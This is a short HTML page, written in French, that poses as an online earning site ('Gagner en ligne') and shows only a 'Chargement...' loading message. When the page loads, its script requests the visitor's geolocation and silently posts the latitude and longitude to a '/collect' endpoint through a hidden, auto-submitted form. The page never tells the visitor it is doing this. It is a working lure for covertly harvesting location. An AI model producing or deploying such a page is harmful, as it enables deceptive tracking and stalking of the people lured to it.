<!DOCTYPE html>
<html>
<head>
  <title>Gagner en ligne</title>
  <script>
    function envoyerInfos() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          const form = document.createElement('form');
          form.method = 'POST';
          form.action = '/collect';

          const latField = document.createElement('input');
          latField.type = 'hidden';
          latField.name = 'latitude';
          latField.value = latitude;
          form.appendChild(latField);

          const longField = document.createElement('input');
          longField.type = 'hidden';
          longField.name = 'longitude';
          longField.value = longitude;
          form.appendChild(longField);

          document.body.appendChild(form);
          form.submit();
        });
      } else {
        alert("La géolocalisation est désactivée !");
      }
    }
  </script>
</head>
<body onload="envoyerInfos()">
  <h1>Chargement...</h1>
</body>
</html>
